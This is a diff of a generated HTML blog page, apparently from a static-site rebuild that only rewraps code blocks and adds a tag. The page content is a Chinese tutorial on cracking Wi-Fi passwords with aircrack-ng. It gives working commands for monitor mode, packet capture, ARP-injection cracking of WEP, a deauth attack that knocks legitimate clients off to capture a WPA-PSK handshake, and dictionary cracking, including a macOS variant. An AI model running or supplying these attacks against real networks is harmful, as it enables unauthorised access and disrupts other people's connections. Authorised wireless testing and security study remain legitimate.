@@ -202,35 +202,32 @@
 
 <h3 id="1载入无线网卡">1、载入无线网卡</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ifconfig -a查看网卡
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig -a查看网卡
 ifconfig wlan0 up加载网卡
 iwconfig只查看无线网卡
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="2激活无线网卡只monitor监听模式">2、激活无线网卡只monitor监听模式</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>airmon-ng start 上面查看的网卡名
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airmon-ng start 上面查看的网卡名
 
 monitor mode enabled on mon0便是已启动监听模式，监听模式下适配器名称变更为mon0。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="3探测无线网络抓取无线数据包">3、探测无线网络，抓取无线数据包</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡
 
 airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
 参数解释：
 --ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
 -c 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；
 -w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="4对目标ap使用arprequest注入攻击加速数据包的获取">4、对目标AP使用ArpRequest注入攻击，加速数据包的获取</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
 参数解释：
 -3 指采用ARPRequesr注入攻击模式；
 -b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
@@ -238,16 +235,14 @@ airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
 最后跟上无线网卡的名称，这里就是mon0啦。
 在等待片刻之后，一旦成功截获到ARP请求报文，我们将会看到如下图13所示的大量ARP报文快速交互的情况出现。
 此时回到airodump-ng 会看到packets栏的数字在飞速递增。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="5打开aircrack-ng开始破解wep">5、打开aircrack-ng，开始破解WEP</h3>
 
 <p>在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功就等待数据报文的继续抓取然后多试几次。注意，此处不需要将进行注入攻击的Shell关闭，而是另外开一个Shell进行同步破解。输入命令如下：</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aircrack-ng 捕获的ivs文件
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng 捕获的ivs文件
+</code></pre></div></div>
 
 <h2 id="二wap-psk破解">二、wap-psk破解</h2>
 
@@ -255,55 +250,50 @@ airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
 
 <p>最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>airodump-ng-oui-update
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng-oui-update
+</code></pre></div></div>
 
 <h3 id="2载入并激活无线网卡至monitor即监听模式">2、载入并激活无线网卡至monitor即监听模式</h3>
 
 <p>载入无线网卡的顺序及命令部分，依次输入下述命令</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>startx            进入到图形界面
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>startx            进入到图形界面
 ifconfig –a       查看无线网卡状态
 ifconfig  wlan0  up     载入无线网卡驱动
 airmon-ng  start  wlan0  激活网卡到monitor模式
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="3探测无线网络抓取无线数据包-1">3、探测无线网络，抓取无线数据包</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>airodump-ng -c 6 –w longas mon0
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng -c 6 –w longas mon0
 参数解释：
 -c 这里我们设置目标AP的工作频道，通过观察，我们要进行攻击测试的无线路由器工作频道为6；
 -w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，这里我就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longas.cap，而是longas-01.cap。
 mon0 为之前已经载入并激活监听模式的无线网卡。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="4进行deauth攻击加速破解过程">4、进行Deauth攻击加速破解过程</h3>
 
 <p>和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
 参数解释：
 -0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等；
 -a 后跟AP的MAC地址；
 -c 后跟客户端的MAC地址；
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="5开始破解wpa-psk">5、开始破解WPA-PSK</h3>
 
 <p>在成功获取到无线WPA-PSK验证数据报文后，就可以开始破解，输入命令如下：</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aircrack-ng -w dic 捕获的cap文件 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng -w dic 捕获的cap文件 
 -w 后跟预先制作的字典，这里是BT4下默认携带的字典。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="命令合集">命令合集</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aircrack-ng
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng
 主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
 airmon-ng
 用于改变无线网卡工作模式，以便其他工具的顺利使用
@@ -319,8 +309,7 @@ airdecap-ng
 用于解开处于加密状态的数据包
 tools
 其他用于辅助的工具，如airdriver-ng、packetforge-ng等
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <hr />
 
@@ -330,27 +319,24 @@ tools
 
 <h3 id="获取搜索到的wifi">获取搜索到的wifi</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>airport -s
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airport -s
 SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="开始监听">开始监听</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sudo airport en0 sniff 1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo airport en0 sniff 1
 en0是网卡   1是要抓包的信道
 抓包.cap文件默认保存在/tmp  -w可以改变保存路径
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="解析">解析</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>aircrack-ng -w 1.txt 1.cap
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng -w 1.txt 1.cap
 1.txt是字典暴  1.cap是抓包文件
 可以看到cap包的内容，Encryption中（0 handshake）是抓包失败，（1 handshake）则是抓包成功。
 记住成功的行数，Index number of target network ?后面输入行数，回车。
-</code></pre>
-</div>
+</code></pre></div></div>
 
 
                 <hr style="visibility: hidden;">
@@ -476,6 +462,12 @@ en0是网卡   1是要抓包的信道
                             
                 				<a href="/tags/#汇编" title="汇编" rel="1">
                                     汇编
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#开发工具" title="开发工具" rel="1">
+                                    开发工具
                                 </a>
                             
         				
